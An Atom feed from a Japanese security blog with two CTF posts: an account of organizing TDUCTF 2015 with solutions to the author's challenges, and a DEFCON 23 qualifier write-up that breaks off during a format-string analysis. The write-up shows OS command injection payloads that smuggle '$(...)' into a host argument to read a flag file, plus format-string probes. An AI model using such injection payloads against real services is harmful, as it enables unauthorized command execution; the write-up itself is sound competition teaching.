<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: ctf | 犬アイコンのみっきー]]></title>
  <link href="http://mzyy94.com/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://mzyy94.com/"/>
  <updated>2016-07-04T20:35:33+09:00</updated>
  <id>http://mzyy94.com/</id>
  <author>
    <name><![CDATA[mzyy94]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[TDUCTF 2015の運営をした話]]></title>
    <link href="http://mzyy94.com/blog/2015/09/18/tductf-2015-digression/"/>
    <updated>2015-09-18T01:33:16+09:00</updated>
    <id>http://mzyy94.com/blog/2015/09/18/tductf-2015-digression</id>
    <content type="html"><![CDATA[<p>みなさんご参加ありがとうございます。
存じ上げている方もたくさんいらっしゃると思いますが、先月末の日曜日にTDUCTF 2015なるものが開催されました。</p>

<p><a href="http://connpass.com/event/17306/"><strong>TDUCTF 2015 - connpass</strong></a></p>

<p>前回開催が3月末にあったのですが、所要で参加できないことがわかり、悔しさからネットワーク系のCTF問題を作って提供しました。</p>

<iframe src="//www.slideshare.net/slideshow/embed_code/key/FxTJmR5D9IePUk?startSlide=14" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/nomuken/ss-46568790" title="メインスライド" target="_blank">メインスライド</a> </strong> from <strong><a href="//www.slideshare.net/nomuken" target="_blank">nomuken</a></strong> </div></p>

<p>そのとき運営陣の@nomuken氏からの「次回は問題作成だけではなく運営陣に加わっていっしょに盛り上げよう」との提案を受け、
今回TDUCTF 2015にて運営側に立つこととなりました。</p>

<p>さて、具体的に運営として何をしてきたかの記録を以下に述べますが、後半には問題のネタバレなどを含んでおります。ご注意ください。</p>

<!-- more -->


<h1>フロントエンドアプリケーションの作成</h1>

<p>TDU CTF 2014 Satellite in ConoHaが無事終了し、次回開催に向けての話が始まりだした時に運営の方々の仲間に入り、どのようにして準備していくかなどの議論をはじめました。
その議論の最初の議題は毎度フルスクラッチなスコアサーバーをどうしようかというものでした。
常設CTFや有志で行われてるオンサイトCTFで<em>イケてるスコアサーバー</em>を見かけないのを悲しく思い、Web開発全然得意じゃないのにも関わらず、</p>

<p><strong>「俺がイケてるCTFスコアサーバー作るよ」</strong></p>

<p>などと言ってしまいました。</p>

<p>すんなりと「お、じゃあお願いするね」と言われて開発することになったのですが、イケてるスコアサーバーはWebフロントエンド部分のことを指しており、
サーバーサイドは別で他のメンバーが開発する、分業となりました。</p>

<p>さて、困った。作ると言い出したものの最近のWebのトレンド知らないしTwitter Bootstrap・jQueryアレルギーだしどうしたものか、と。</p>

<p>まだ開催まで時間あるしとりあえずトレンド調査だけしておこうと思い、いろいろ調べるだけ調べて放置していました。</p>

<p>時は流れ、TDUCTF 2015開催２週間前。</p>

<p>Slackに流れる「フロントエンドの進捗どうですか？」の文字列。
手元のソースコードリポジトリで<code>git log</code>をしてみたところ、</p>

<pre><code>fatal: bad default revision 'HEAD'
</code></pre>

<p>アカン。</p>

<p>その日から睡眠時間を削り、圧倒的進捗率を叩き出すべく腱鞘炎になりながらもコードを書き続けました。</p>

<p>コミットはゼロでも頭の中に構想は練ってあったので、あとはキーボードを叩きまくるだけという状態になっていたものの、
時間が足りない上に睡眠不足でタイポするわで結構大変でした。</p>

<p>トレンド調査で、<a href="https://facebook.github.io/react/">React</a>+<a href="https://facebook.github.io/flux/">Flux</a>の構造を軸に、見た目は<a href="http://semantic-ui.com/">Semantic UI 2</a>で整え、<a href="http://electron.atom.io/">Electron</a>で単一アプリケーション化するのがモダンでイケてる感じであるとわかったので、これらを用いて組み立てていくことにしました。
Electronでアプリケーション化したのは、「今までにないイケてるCTFスコアサーバー」の形を実現する目的に加えて、「マルチブラウザ対応に追われる時間をゼロにする」目的もありました。結果として、Internet Explorer（CTF参加者に利用者はいるのだろうか？）などのへの対応のためにバッドノウハウを使わなくて済みました。</p>

<p>途中Flux部分にしっくりくるものがなく、<a href="http://rackt.github.io/redux/">Redux</a>に変更するまでに時間を要したものの、2週間ぶっ通しの突貫工事でなんとか、開催までに&#8221;形にする&#8221;ことができ、参加者に楽しんでいたくことができたと思います。</p>

<p>開催までは非公開で管理していたのですが、オープンソースで公開するとの話があったので、現在はGitHubにて公開しています。</p>

<p><a href="https://github.com/lepus-ctf/lepus-frontend/">lepus-ctf/lepus-frontend · GitHub</a></p>

<p>詳しい開発秘話はしないので、苦労は上記リポジトリのコミットログから察してください。</p>

<h1>問題作成</h1>

<p>CTFの主軸となる問題作成に関しての話です。
ネタバレが含まれるので問題を解きたい人はお気をつけを。</p>

<p>CTFの運営として参加しているので、問題の作成はほぼ必須なのですが、なにせフロントエンドアプリケーションの作成に追われていて、
「案はあるけど作ってる暇がない」ということとなってしまい、少ししか用意できませんでした。
問題案などはストックできてるので次回開催時に登場する予定です。</p>

<p>用意した問題は一部を除いて以下のサイトで公開しています。</p>

<p><a href="http://ctf.mzyy94.com">ctf.mzyy94.com</a></p>

<p>問題の作成意図と簡単な想定解法を紹介します。
あと、TDUCTF 2015は初心者歓迎を掲げて開催してたので、プロ向けの問題はあまりありません。</p>

<h2>Keygenerator</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-BIN200/">http://ctf.mzyy94.com/q/TDUCTF2015-BIN200/</a></p>

<p>問題文: 実行してフラッグをゲットせよ！</p>

<p>この問題は、与えられた実行ファイルを実行しろというものです。
libprintkey.soという自作共有ライブラリとkey_generatorという実行アプリケーションが渡されるのですが、
普通にアプリケーションを実行したりデバッグしてもフラグは得られません。</p>

<p>作成意図としては、「共有ライブラリも単体実行可能」という点に気づいて、
問題文の「実行して」のとおりに共有ライブラリに実行可能フラグを立てて、
<code>./libprintkey.so</code>とすれば、フラグが出力されるようになっていました。</p>

<p>gdbなどでkey_generatorをデバッグしてた方から、「あるべきところにフラグがないがどういうことなのか？」という質問がありましたが、
すいません、そっちじゃなかったんです。</p>

<p>単純に実行してフラグを得られるため初期の想定では100点問題になるとしていたのですが、
配点会議でライブラリの単体実行するポイントに気づかない人も多いかもしれないとのことで、200点に引き上げられました。</p>

<h2>devnull</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-BIN250/">http://ctf.mzyy94.com/q/TDUCTF2015-BIN250/</a></p>

<p>問題文: Usage: ./devnull > /dev/null</p>

<p>実行すると、標準出力を/dev/nullにリダイレクトしてくれとUsageが出てきて、
そのとおりに実行すると、/dev/nullにフラグが出力されるというものです。</p>

<p>リダイレクト先をパスで判定しているので、/dev/nullを適当なブロックファイルに差し替えるか、
gdbでブレイクポイントを仕掛けたり、ltraceとかで処理を追って、出力される部分を覗き見できればフラグが得られます。</p>

<p>gdbの使い方に慣れてほしいという願いを込めて作っていたので、想定していた解法は以下のとおりです。</p>

<pre><code>$ gdb ./devnull
(gdb) b printf
(gdb) r &gt; /dev/null
(gdb) i r
(gdb) x/s $rsi
</code></pre>

<h2>「名前が変えられいるってことで間違いないな」</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-MISC200/">http://ctf.mzyy94.com/q/TDUCTF2015-MISC200/</a></p>

<p>問題文: password:password</p>

<p>問題には拡張子がjpgのファイルが付属しています(JPEGファイルとは言っていない)。</p>

<p>CTFに必要なググり力を問うための問題で、問題タイトルを検索ワードにググると、
ほこ×たてのハッキング対決に関する記事がいくつかヒットします。
ほこ×たて内では 「名前が変えられいるってことで間違いないな」は「TrueCryptで暗号化されている」のことを指しているという記事が見つかるので、
添付のファイルをTrueCryptを用いてパスワードにpasswordを指定してマウントすると、フラグが出てきます。</p>

<h2>Portscan</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-NW500/">http://ctf.mzyy94.com/q/TDUCTF2015-NW500/</a></p>

<p>問題文: ポートスキャンが仕掛けられた！ん？何かメッセージがついてきているぞ？</p>

<p>UDPポートスキャンを観測したpcapファイルが渡されます。
UDPのペイロードに1バイトずつメッセージがついてきてるのでそれを抽出してあげるとフラグが取得できる問題です。</p>

<p>この問題は、WiresharkのFollow UDP Streamですぐに答えが出るようではひねりがないと思い、
tcpdumpやtsharkのオプションを覗いたり他のパケット解析ツールを使ってほしいという想いを込めて作成しました。
なので、Wiresharkで解くことはほとんど不可能です。</p>

<p>想定していた解答方法は以下のとおりです。
最初は100点くらいの配点にしようとしていたのですが、配点会議で「これはわからん」と言われ急遽500点まで引き上げられました。</p>

<pre><code class="bash">printf $(tcpdump -r secretmsg.pcap -x 'udp' | grep 0x0010 | perl -pe's/^.*(..)00 0000\n$/\\x\1/')
</code></pre>

<h2>Lucky 7</h2>

<p>この問題はサーバーにアクセスするタイプのネットワーク問題なのでオンサイトでしか用意しておらず、現在は公開していません。
問題内容は、netcatでアクセスすると以下のような表示が返ってくるものです。</p>

<pre><code>Challenge!
2187123 != 77777777
</code></pre>

<p>左辺にある数字が77777777と等しくなるようにアクセスするとフラグが降ってくるのではないかとピンとくる人もいれば、
ランダムに変化するからBruteforceで解こうする人もいたりと、サーバーを監視していてなるほどと感じることが多かったです。
この左辺の数字は、サーバー側が<code>Challenge!</code>を返す際のAcknowledge Numberになっており、ここが77777777になっていないためにエラーが返されているのです。
Wiresharkなどで監視しながらアクセスしていたひとは、この関連性がわかったとおもいます。</p>

<p>Sequential Numberをいじれるhping3やScapyに触れてもらおうという願いを込めて作成しました。
解法としてはそれらを用いて、3-way handshakeが終了した時点のSequential Number(= サーバーがChallenge!を返す際のAcknowledge Number)が77777777になるようにコネクションを張り始めるようにすれば、フラグが返ってくるというものでした。</p>

<h2>moneyscript</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-MISC400/">http://ctf.mzyy94.com/q/TDUCTF2015-MISC400/</a></p>

<p>問題文: 6a29585444557b426974636f696e21426974636f696e21426974636f696e217d</p>

<p>moneyscriptシリーズの1問目です。こちらは簡単な方です。
moneyscriptのmoneyが指すのはBitcoinで、このシリーズの問題はBitcoin Scriptを実行して答えを得る問題となっています。
1問目は優しめに作ってあり、適当にデコードすればフラグが得られるよになっていますが、Bitcoin Scriptとは何かを理解してほしく作成しました。</p>

<p>Googleで検索するとBitcoin ScriptのWikiがヒットします。</p>

<p><a href="https://en.bitcoin.it/wiki/Script">Script - Bitcoin Wiki</a></p>

<p>このWikiにしたがって問題文のBitcoin Scriptが意味するところを先頭から照らしていくと、</p>

<ul>
<li>0x6a = OP_RETURN</li>
<li>0x29 = 41バイト確保</li>
</ul>


<p>それ以降は文字コードの16新表記となっています。</p>

<p>なので、適当にデコードするだけでフラグが出てきてしまいますが、Bitcoin Scriptの仕組みを知ってもらえたらとおもい、作成しました。</p>

<h2>moneyscript!!!</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-MISC600/">http://ctf.mzyy94.com/q/TDUCTF2015-MISC600/</a></p>

<p>問題文は上記リンクから閲覧ください。</p>

<p>こちらは難しい方のBitcoin Script問題です。
先ほどのWikiにアクセスできていれば、照らしあわせて脳内で実行すればいいのですが、
少々骨の折れるものなので、Bitcoin Scriptを扱えるアプリケーションを使う必要が出てきます。</p>

<p>任意のアプリケーションを使って解いてもらえればいいのですが、
Node.jsのモジュールに、<a href="http://bitcore.io/">bitcore</a>というモジュールがあるので、それを用いて以下のように実行するなどして、フラグを取得できます。</p>

<pre><code class="javascript">var bitcore = require('bitcore');
var Script = bitcore.Script;
var code = '4c0155828f635e76937367595294687b736b7c6c938f618fa76b4c0222ea6c';

var buffer = new Buffer(code, 'hex');
var interpreter = Script.Interpreter();

interpreter.script = new Script(buffer);
interpreter.evaluate();

var first_stack = interpreter.stack.pop();
var hex_string = first_stack.toJSON().data.map(function(x) {
    return x.toString(16);
})

var flag = 'TDU{' + hex_string.join('') + '}';

console.log(flag);
</code></pre>

<h1>開催について</h1>

<p>フロントエンドアプリケーションの作成がギリギリだったがために、RESTサーバーのテストが十分にできず、運営陣には多くの迷惑をかけてしまいました。
また、フロントエンドアプリケーション側もテストが追いつかず、バグだらけで配布してしまったがために、当日は問題の添付ファイルが破損していたり、
カウントダウンが正常に機能しないなどのバグを発生させてしまい、参加者各位にも大変に迷惑をかけてしまいました。
その節は申し訳ありませんでした。</p>

<p>TDUCTF 2015終了後、反省会をオンラインで開催していた頃に「TDUCTF」という名称を変更しようという話が立ち上がり、
よくわらかないテンションでドメインから何から整え新名称に改称しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">TDUCTFからLepusCTFの移行で面白いのは4&#10;・新名称考案&#10;・サーバー確保&#10;・ドメイン取得&#10;・GitHub移行&#10;・Webサイト作成&#10;・アイコン作成&#10;・Twitter移行&#10;を4時間以内でやったというところ <a href="https://twitter.com/hashtag/lepusctf?src=hash">#lepusctf</a></p>&mdash; 友利奈緒 (@mzyy94) <a href="https://twitter.com/mzyy94/status/638606548818726912">2015, 9月 1</a></blockquote>


<p> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></p>

<p>ということなので、今後はTDUCTFあらため、<a href="http://lepus-ctf.org/">LepusCTF</a>をよろしくお願いします。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DEFCON CTF 23予選 Write-up (解説付き(すこし))]]></title>
    <link href="http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup/"/>
    <updated>2015-05-18T23:45:04+09:00</updated>
    <id>http://mzyy94.com/blog/2015/05/18/defcon-qual-23-writeup</id>
    <content type="html"><![CDATA[<p>今年のDEFCON CTFの予選が5月16日午前9時から48時間開催されていました。今回はチーム********としての参加ではなく、Team Enuに派遣される形で参加してきました。</p>

<p>今年は、比較的やさしいBaby&#8217;s First問題とPwn問題、リバースエンジニアリングのジャンルに属する問題が各数問あり、加えてWebとCoding Challengeが1問ずつありました。
複数ある問題の中でFlagをsubmitしたのは1問だけですが、いくつか正解までたどり着くところまで解けたのでWrite-upを記します。</p>

<!-- more -->


<h1>Babycmd</h1>

<h2>問題文</h2>

<pre><code>babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me:15491

[Download](http://downloads.notmalware.ru/babycmd_3ad28b10e8ab283d7df81795075f600b)
</code></pre>

<h2>問題</h2>

<pre><code>Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: 
</code></pre>

<p>pingとhostとdigコマンドが実行できるアプリケーションにアクセスして、どうにかしてflagを獲得する問題。
逆アセンブルした結果、<em>コマンド[スペース]引数</em>として標準入力から渡すと、コマンドが( dig | ping | host | exit | help )かどうかで分岐し、引数が適切であるか、またIPアドレスかどうかをチェックし、コマンドをpopen経由で実行しているものでした。
<code>strings</code>コマンドと<code>grep</code>で<em>%s</em>がある記述を探したところ、各コマンドは引数がIPアドレスなのかそれ以外かで分岐し、</p>

<table>
<thead>
<tr>
<th>タイプ </th>
<th> 実行コマンド</th>
</tr>
</thead>
<tbody>
<tr>
<td>dig (IPアドレス）</td>
<td> <code>dig -x 引数</code></td>
</tr>
<tr>
<td>dig（文字列）</td>
<td><code>dig '引数'</code></td>
</tr>
<tr>
<td>ping（IPアドレスのみ）</td>
<td><code>ping -c 3 -W 3 引数</code></td>
</tr>
<tr>
<td>host（IPアドレス）</td>
<td><code>host 引数</code></td>
</tr>
<tr>
<td>host（文字列）</td>
<td><code>host "引数"</code></td>
</tr>
</tbody>
</table>


<p>としてpopenで実行されるようになっていました。</p>

<p>適当にPublic DNS宛にPingを送ってみると以下のような表示になりました。</p>

<pre><code>Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_req=1 ttl=128 time=9.51 ms
64 bytes from 8.8.8.8: icmp_req=2 ttl=128 time=9.53 ms
64 bytes from 8.8.8.8: icmp_req=3 ttl=128 time=9.95 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0 0x7fffd2999630acket loss, time 2005ms
rtt min/avg/max/mdev = 9.515/9.667/9.956/0.219 ms
Commands: ping, dig, host, exit
:
</code></pre>

<p>pingの出力結果に含まれる<strong>% Packet</strong>が、フォーマット文字列の<em>%p</em>として解釈され、アドレスが表示されていることがわかりました。format string attack(後述)として攻められるような感じがしましたが、他の人が取り組んでいるようなので違う方法でアプローチをしていくことにしました。</p>

<p>digとhostに文字列を渡した時の括りがそれぞれ違うことに注目しました。digではシングルクオートで、hostではダブルクオートでくくって引数を渡しています。
シェル上では、ダブルクオートの文字列の中で変数を展開できます。<code>echo "$SHELL"</code>とすると<em>/bin/bash</em>と出力されるのがいい例です。今回の問題の場合は、<code>host $SHELL</code>として標準入力から渡すと、<code>host "/bin/bash"</code>として実行されると考えられます。</p>

<pre><code>Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: host $PWD
Invalid hostname.
Commands: ping, dig, host, exit
:
</code></pre>

<p>しかしながら、試しに<code>host $PWD</code>として打ってみたところ、引数チェックで引っかかり、<em>popen</em>で実行されませんでした。</p>

<p>逆コンパイルの結果、引数チェックでは最初と最後の文字が数字もしくはアルファベットでない場合にエラーとして実行させないようにしていることがわかったので、<code>host A${PWD}A</code>として実行してみました。</p>

<pre><code>Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: host $PWD
Invalid hostname.
Commands: ping, dig, host, exit
: host A${PWD}A
Host A/A not found: 3(NXDOMAIN)
Commands: ping, dig, host, exit
:
</code></pre>

<p>変数展開されていることが確認できました。/ディレクトリがカレントディレクトリのようです。</p>

<h2>攻撃手法：OSコマンド インジェクション</h2>

<p>これができることがわかると、次に挑戦したくなるのは変数中のコマンド展開によるOSコマンド インジェクションです。
コマンド展開とは、ダブルクオート中に変数を展開するのと同じ要領で、<em>$(コマンド)</em>としてコマンドを実行し、文字列中にコマンドの出力を展開するものです。例として、<code>echo "$(uname)"</code>とすると<em>Linux</em>と返ってきます。これを用いて実行中のユーザーを確認します。</p>

<pre><code>Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: host A$(whoami)A
Host AbabycmdA not found: 3(NXDOMAIN)
Commands: ping, dig, host, exit
:
</code></pre>

<p>babycmdユーザーとして実行されていることがわかりました。
そこで、ホームディレクトリ内のファイル一覧を取得してみることにしました。</p>

<pre><code>Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: host A$(ls /home/babycmd)A
sh: 1: ls/home/babycmd: not found
Host AA not found: 3(NXDOMAIN)
Commands: ping, dig, host, exit
:
</code></pre>

<p>引数に渡される文字列に含まれるスペースが削られるようです。タブで代用してみました。</p>

<pre><code>Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: host A$(ls    /home/babycmd)A
Host Ababycmd
flagA not found: 3(NXDOMAIN)
Commands: ping, dig, host, exit
</code></pre>

<p>ホームディレクトリにbabycmdとflagというファイルがあることがわかりました。
catのリダイレクトでflagを抜いてしまいます。</p>

<pre><code>Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
:  host A$(cat&lt;/home/babycmd/flag)A
Host AThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??A not found: 3(NXDOMAIN)
Commands: ping, dig, host, exit
:
</code></pre>

<p>FLAG:<code>Pretty easy eh!!~ Now let's try something hArd3r, shallwe??</code></p>

<p>OSコマンドインジェクションに関連する脆弱性対策をIPAが公開してくれているので、CTFのためにも自衛のためにも一度目を通しておくことをお勧めします。</p>

<p><a href="http://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/c909.html">IPA ISEC　セキュア・プログラミング講座：C/C++言語編　第10章 著名な脆弱性対策：コマンド注入攻撃対策</a></p>

<h1>Babyecho</h1>

<h2>問題文</h2>

<pre><code>babyecho_eb11fdf6e40236b1a37b7974c53b6c3d.quals.shallweplayaga.me:3232

[Download](http://downloads.notmalware.ru/babyecho_eb11fdf6e40236b1a37b7974c53b6c3d)
</code></pre>

<h2>問題</h2>

<pre><code>Reading 13 bytes
</code></pre>

<p>標準入力で待ち受けしているので、文字列を送ると標準出力に<del>そのまま</del><em>的確に</em>返してくれるプログラムにアクセスしてflagを得る問題です。</p>

<pre><code>Reading 13 bytes
%p.%p.%p.%p
0xd.0xa.(nil).0xd
Reading 13 bytes
0123456789abcdef
0123456789ab
Reading 13 bytes
def
Reading 13 bytes
</code></pre>

<p>フォーマット文字列が使えて、12文字を越えると次の入力として処理されるようです。</p>

<p>バイナリを<code>strings</code>コマンドでみてみると、入力待ちの直前に表示されている<em>Reading 13 bytes</em>の13という数字は可変であることがわかります。</p>

<pre><code>$ strings ./babyecho_eb11fdf6e40236b1a37b7974c53b6c3d | grep Reading
Reading %d bytes
</code></pre>

<p>フォーマット文字列を使ってスタックの中身をもうすこしみてみます。</p>

<pre><code>Reading 13 bytes
AAAA%5$p
AAAA0xffea839c
Reading 13 bytes
AAAA%6$p
AAAA(nil)
Reading 13 bytes
AAAA%7$p
AAAA0x41414141
Reading 13 bytes
</code></pre>

<p><em>AAAA%7$p</em>を渡した状態の時、以下のようにスタック(esp)に積まれていることがわかります。</p>

<p><svg width="300" height="400" style="background-color: #fff">
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0xffea839c</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x41414141</tspan>
</text>
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,260)">+0x18</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,300)">+0x1c</text>
</svg></p>

<p>esp+0x1cの位置から標準入力の値の格納バッファーが確保されているようです。</p>

<p>先ほど調査したスタックをみてみると、読み込みバイト数らしき13(=0x0000000d)が2箇所積まれているのがわかります。
IDA pro (demo)で入力待ちになるときの直前の処理を追ってみます。</p>

<p><img src="/blog/resources/images/2015/05/18/babyecho-debugging.png" alt="IDA pro demo debugging" /></p>

<p>この入力と出力を繰り返すループ(0x08048FB6)の直前の処理で、サイズ0x420のスタックを用意し、スタック内の値をいくつかセットしているところがあります。この値のセットで、esp+0x14にesp+0x1cのアドレスをセットしている部分があります(0x08048f57)。esp+0x1cは、先ほどの調査より標準入力の値が格納されるバッファーの開始位置です。このことから、先ほど<em>AAAA%5$p</em>を入力して返ってきた値<em>0xffea839c</em>は、標準入力からの値を格納するバッファーのアドレスを指しているということになります。</p>

<p>loc_8048fb6のループを見てみると、&#8221;Reading %d bytes\n&#8221;で表示されるバイト数をesp+0x10からesp+0x04にコピーしている処理があります(0x08048fcc)。printfで&#8221;Reading %d bytes\n&#8221;を表示した後、 esp+0x08に0x0aを入れ、標準入力からの読み取り上限をesp+0x10からesp+0x04にコピーしてセットし、esp+0x1cに標準入力からの値を読み取っています。</p>

<p><svg width="640" height="400" style="background-color: #fff">
<g class="block" transform="translate(80,20)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x????????</tspan>
</text>
</g>
<g class="block" transform="translate(80,60)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,100)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000a</tspan>
</text>
</g>
<g class="block" transform="translate(80,140)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,180)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x0000000d</tspan>
</text>
</g>
<g class="block" transform="translate(80,220)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0xffea839c</tspan>
</text>
</g>
<g class="block" transform="translate(80,260)">
<rect rx="0" ry="0" width="200" height="40" fill="none" stroke="#000000" stroke-width="1">
</rect>
<text text-anchor="middle" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" fill="black" transform="translate(100,20)">
<tspan x="0" y="0" dy=".35em">0x00000000</tspan>
</text>
</g>
<g class="block" transform="translate(80,300)">
<path stroke="#000000" fill="none" d="M0,40V0h200v40" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M200,40v40" stroke-dasharray="2" stroke-width="1" />
<path stroke="#000000" fill="none" d="M0,80h200" stroke-dasharray="2" stroke-width="1" />
</g>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,20)">esp</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,60)">+0x04</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,100)">+0x08</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,140)">+0x0c</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,180)">+0x10</text>
<text class="address" text-anchor="end" fill="black" font-family="Consolas, 'Courier New', Courier, Monaco, monospace" dy=".35em" transform="translate(70,220)">+0x14</text>
